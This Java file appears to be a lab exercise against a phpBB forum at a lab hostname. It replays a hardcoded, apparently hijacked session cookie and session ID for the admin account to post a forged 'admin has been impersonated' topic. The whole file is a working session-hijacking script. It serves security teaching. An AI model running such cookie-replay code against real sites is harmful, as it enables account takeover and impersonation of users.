import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class HttpURLConnectionDriver {

	private final String USER_AGENT = "Mozilla/5.0";

	public static void main(String[] args) throws Exception {

		HttpURLConnectionDriver connection = new HttpURLConnectionDriver();

		System.out.println("\nTesting 2 - Send Http POST request");
		connection.sendPost();

	}

	// HTTP POST request
	private void sendPost() throws Exception {

		String url = "http://www.xsslabphpbb.com/posting.php";
		URL obj = new URL(url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();

		//add reuqest header
		con.setRequestMethod("POST");
		con.setRequestProperty("User-Agent", USER_AGENT);
		con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		con.setRequestProperty("Cookie", "phpbb2mysql_t=a%3A7%3A%7Bi%3A5%3Bi%3A1493053479%3Bi%3A8%3Bi%3A1493055530%3Bi%3A1%3Bi%3A1493054829%3Bi%3A9%3Bi%3A1493055534%3Bi%3A10%3Bi%3A1493055469%3Bi%3A7%3Bi%3A1493055525%3Bi%3A11%3Bi%3A1493086708%3B%7D; phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=2797ee8b3f173b3a19d558ae9eaf660c");
		con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		con.setRequestProperty("Connection", "keep-alive");
		String body = "subject=Task+4&addbbcode18=%23444444&addbbcode20=0&helpbox=Font+color%3A+%5Bcolor%3Dred%5Dtext%5B%2Fcolor%5D++Tip%3A+you+can+also+use+color%3D%23FF0000&message=admin+has+been+impersonated&topictype=0&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=2797ee8b3f173b3a19d558ae9eaf660c&f=1&post=Submit";

		// Send post request
		con.setDoOutput(true);
		DataOutputStream wr = new DataOutputStream(con.getOutputStream());
		wr.writeBytes(body);
		wr.flush();
		wr.close();

		int responseCode = con.getResponseCode();
		System.out.println("\nSending 'POST' request to URL : " + url);
		System.out.println("Post parameters : " + body);
		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(
		        new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();

		//print result
		System.out.println(response.toString());

	}

}